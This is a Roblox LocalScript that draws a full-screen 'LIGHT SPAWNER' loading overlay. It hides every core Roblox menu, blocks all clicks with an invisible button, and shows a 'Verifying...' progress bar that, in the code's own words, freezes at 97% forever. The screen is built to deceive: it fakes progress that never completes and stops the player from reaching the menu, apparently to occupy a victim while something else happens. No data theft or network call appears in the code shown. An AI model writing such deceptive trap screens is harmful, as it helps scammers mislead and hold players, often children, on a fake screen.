-- LoadingScreen LocalScript
-- Place inside StarterGui as a LocalScript
-- ScreenGui: ResetOnSpawn = false, IgnoreGuiInset = true, DisplayOrder = 9999

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ── Hide ALL Roblox CoreGui (menu button, backpack, chat, health, etc.) ──
pcall(function()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
end)

-- ── ScreenGui ─────────────────────────────────────────────────────────────
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 9999
screenGui.Enabled = true
screenGui.Parent = playerGui

-- ── Full-screen black backdrop ────────────────────────────────────────────
local backdrop = Instance.new("Frame")
backdrop.Name = "Backdrop"
backdrop.Size = UDim2.new(1, 0, 1, 0)
backdrop.Position = UDim2.new(0, 0, 0, 0)
backdrop.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
backdrop.BorderSizePixel = 0
backdrop.ZIndex = 1
backdrop.Parent = screenGui

-- Invisible button so no clicks pass through
local inputBlocker = Instance.new("TextButton")
inputBlocker.Size = UDim2.new(1, 0, 1, 0)
inputBlocker.BackgroundTransparency = 1
inputBlocker.Text = ""
inputBlocker.ZIndex = 100
inputBlocker.Parent = backdrop

-- ── Layout container (centered column) ───────────────────────────────────
local container = Instance.new("Frame")
container.Name = "Container"
container.Size = UDim2.new(0.75, 0, 0.75, 0)
container.Position = UDim2.new(0.125, 0, 0.1, 0)
container.BackgroundTransparency = 1
container.ZIndex = 2
container.Parent = backdrop

local layout = Instance.new("UIListLayout")
layout.FillDirection = Enum.FillDirection.Vertical
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.VerticalAlignment = Enum.VerticalAlignment.Top
layout.Padding = UDim.new(0, 14)
layout.Parent = container

-- ── Avatar ring ───────────────────────────────────────────────────────────
local avatarRing = Instance.new("Frame")
avatarRing.Name = "AvatarRing"
avatarRing.Size = UDim2.new(0, 120, 0, 120)
avatarRing.BackgroundColor3 = Color3.fromRGB(30, 140, 255)
avatarRing.BorderSizePixel = 0
avatarRing.ZIndex = 3
avatarRing.LayoutOrder = 1
avatarRing.Parent = container
Instance.new("UICorner", avatarRing).CornerRadius = UDim.new(1, 0)

local avatarInner = Instance.new("Frame")
avatarInner.Size = UDim2.new(1, -8, 1, -8)
avatarInner.Position = UDim2.new(0, 4, 0, 4)
avatarInner.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
avatarInner.BorderSizePixel = 0
avatarInner.ZIndex = 4
avatarInner.Parent = avatarRing
Instance.new("UICorner", avatarInner).CornerRadius = UDim.new(1, 0)

local avatarImage = Instance.new("ImageLabel")
avatarImage.Size = UDim2.new(1, 0, 1, 0)
avatarImage.BackgroundTransparency = 1
avatarImage.Image = ""
avatarImage.ZIndex = 5
avatarImage.Parent = avatarInner
Instance.new("UICorner", avatarImage).CornerRadius = UDim.new(1, 0)

-- Fetch player headshot
task.spawn(function()
    local ok, url = pcall(function()
        return Players:GetUserThumbnailAsync(
            player.UserId,
            Enum.ThumbnailType.HeadShot,
            Enum.ThumbnailSize.Size420x420
        )
    end)
    if ok and url then
        avatarImage.Image = url
    end
end)

-- ── Title ─────────────────────────────────────────────────────────────────
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 52)
title.BackgroundTransparency = 1
title.Text = "LIGHT SPAWNER"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextScaled = true
title.ZIndex = 3
title.LayoutOrder = 2
title.Parent = container

-- ── Subtitle ──────────────────────────────────────────────────────────────
local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, 0, 0, 24)
subtitle.BackgroundTransparency = 1
subtitle.Text = "LOADING SCRIPT"
subtitle.TextColor3 = Color3.fromRGB(30, 140, 255)
subtitle.Font = Enum.Font.Gotham
subtitle.TextScaled = true
subtitle.ZIndex = 3
subtitle.LayoutOrder = 3
subtitle.Parent = container

-- ── "Verifying..." label ──────────────────────────────────────────────────
local verifyLabel = Instance.new("TextLabel")
verifyLabel.Size = UDim2.new(1, 0, 0, 22)
verifyLabel.BackgroundTransparency = 1
verifyLabel.Text = "Verifying..."
verifyLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
verifyLabel.Font = Enum.Font.Gotham
verifyLabel.TextScaled = true
verifyLabel.ZIndex = 3
verifyLabel.LayoutOrder = 4
verifyLabel.Parent = container

-- ── Progress bar background ───────────────────────────────────────────────
local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(1, 0, 0, 14)
barBg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
barBg.BorderSizePixel = 0
barBg.ZIndex = 3
barBg.LayoutOrder = 5
barBg.Parent = container
Instance.new("UICorner", barBg).CornerRadius = UDim.new(1, 0)

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0.01, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(30, 140, 255)
barFill.BorderSizePixel = 0
barFill.ZIndex = 4
barFill.Parent = barBg
Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)

-- ── Percentage label ──────────────────────────────────────────────────────
local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(1, 0, 0, 30)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "1%"
percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentLabel.Font = Enum.Font.GothamBold
percentLabel.TextScaled = true
percentLabel.ZIndex = 3
percentLabel.LayoutOrder = 6
percentLabel.Parent = container

-- ── Loading animation (slow crawl, freezes at 97%) ────────────────────────
task.spawn(function()
    local current = 1
    local MAX = 97

    while current < MAX do
        local delay = math.random(80, 250) / 100

        if current >= 85 then
            delay = math.random(200, 500) / 100
        end

        task.wait(delay)

        local step = (current >= 85) and 1 or math.random(1, 2)
        current = math.min(current + step, MAX)

        percentLabel.Text = current .. "%"

        TweenService:Create(barFill, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
            Size = UDim2.new(current / 100, 0, 1, 0)
        }):Play()
    end

    -- Stuck at 97% forever
end)
